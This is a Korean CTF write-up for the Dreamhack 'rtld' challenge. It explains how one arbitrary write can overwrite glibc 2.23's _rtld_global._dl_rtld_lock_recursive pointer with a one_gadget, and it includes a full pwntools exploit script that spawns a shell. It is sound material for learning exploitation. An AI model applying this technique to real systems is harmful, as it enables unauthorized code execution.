# rtld — _rtld_global overwrite (glibc 2.23)

Dreamhack `rtld` — **단 한 번의 임의 주소 쓰기(AAW)** 로 로더의 `_rtld_global` 함수 포인터를 덮어
프로그램 종료 과정에서 셸을 얻는 기법.

바이너리: x86-64, PIE. libc **2.23**, ld **2.23** 동봉. (개념 배경은 `../note.md`)

---

## 0. 한눈에

| 항목 | 값 |
|---|---|
| 능력 | `*(long*)addr = value` **딱 1회** (AAW 1발) |
| 릭 | `printf("stdout: %p")` 가 `stdout` 주소를 뿌림 → **libc/ld base 계산 가능** |
| 타겟 | `_rtld_global._dl_rtld_lock_recursive` 함수 포인터 |
| 트리거 | `main`의 `return` → 로더 `_dl_fini()`가 그 포인터를 **호출** |
| 페이로드 | 쓰기 1발이라 인자 세팅 불가 → **one_gadget** |

```c
int main() {
    printf("stdout: %p\n", stdout);   // ★ libc 릭
    scanf("%ld", &addr);
    scanf("%ld", &value);
    *(long *)addr = value;            // ★ AAW 딱 1회
    return 0;                         // ★ 여기서 로더가 함수포인터 호출 → 트리거
}
```

---

## 1. 왜 _rtld_global인가 — "쓰기 1발로 어떻게 실행 흐름을?"

쓰기가 1회뿐이라 GOT overwrite로 `system` 호출을 꾸밀 여유가 없다(인자 세팅 불가).
그래서 **"내가 아무것도 안 해도 프로그램이 알아서 호출해 주는 함수 포인터"** 가 필요하다.

`main`이 `return` 하면 내부적으로:

```
__libc_start_main → exit → __run_exit_handlers → _dl_fini()
```

가 실행되는데, `_dl_fini()` 안에서:

```c
// glibc
__rtld_lock_lock_recursive (GL(dl_load_lock));
// 매크로 전개:
#define __rtld_lock_lock_recursive(NAME) \
    GL(dl_rtld_lock_recursive) (&(NAME).mutex)
```

즉 **`_rtld_global._dl_rtld_lock_recursive` 라는 함수 포인터를, 인자 `&_dl_load_lock`로 호출**한다.
이 포인터는 ld의 **rw 영역**에 있어 **덮어쓸 수 있다**(hook overwrite와 같은 발상, glibc 2.34 이전 한정).

→ 이 포인터를 one_gadget으로 덮고 return 시키면 끝.

---

## 2. 릭 → base 계산

```
stdout(= &_IO_2_1_stdout_) 릭
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
ld_base   = libc_base + 0x3ca000          # 2.23에서 libc↔ld 고정 오프셋
```

libc와 ld는 연속 매핑이라 base 간 오프셋이 고정 → stdout 하나로 둘 다 구함.

---

## 3. 타겟 주소

```
_rtld_global          = ld_base + ld.sym['_rtld_global']
_dl_rtld_lock_recursive = _rtld_global + 3848   # 2.23 기준 구조체 오프셋
```

`+3848`은 `p &_rtld_global._dl_rtld_lock_recursive` 로 확인한 멤버 오프셋(버전마다 다름).

---

## 4. 왜 one_gadget인가

쓰기 1발이라 `_dl_rtld_lock_recursive`에 넣을 수 있는 건 **주소 하나뿐**. 인자를 세팅할 수 없다.
그래서 "특정 스택 조건만 맞으면 레지스터 세팅 없이 `execve('/bin/sh')` 되는" **one_gadget**을 쓴다.

```
one_gadget libc-2.23.so  →  0x4527a  (조건 만족하는 것 선택)
og = libc_base + 0x4527a
```

---

## 5. Exploit (`poc.py`)

```python
from pwn import *
p = remote('host3.dreamhack.games', 9753)
libc = ELF('./libc-2.23.so'); ld = ELF('./ld-2.23.so')

p.recvuntil(b': ')
stdout    = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base   = libc_base + 0x3ca000

rtld_global            = ld_base + ld.symbols['_rtld_global']
dl_rtld_lock_recursive = rtld_global + 3848
og = libc_base + 0x4527a                 # one_gadget

# AAW 1발: 함수포인터 = one_gadget
p.sendlineafter(b'addr: ',  str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'value: ', str(og).encode())
# return → _dl_fini → 덮인 포인터 호출 → shell
p.interactive()
```

---

## 6. 배울 점

- **AAW가 1발뿐일 때 1순위 후보 = _rtld_global 함수 포인터.** 내가 트리거를 안 짜도 `return`만 하면 로더가 호출해 준다.
- 호출 경로: `return → exit → __run_exit_handlers → _dl_fini → GL(dl_rtld_lock_recursive)`. glibc **2.34 이전**에서만 유효(이후 PTR_MANGLE/제거됨).
- 인자 통제가 안 되므로 **one_gadget**. 안 터지면 다른 offset의 one_gadget(제약조건이 다름)으로 교체.
- `+3848` 같은 멤버 오프셋은 **버전마다 다르니** gdb `p &_rtld_global._dl_rtld_lock_recursive`로 직접 확인.
- 비교: `../overwrite_rtld_global`은 쓰기가 **반복**이라 one_gadget 없이 `dl_load_lock`에 `"/bin/sh"`를 깔고 포인터를 `system`으로 덮는 더 깔끔한 변형.
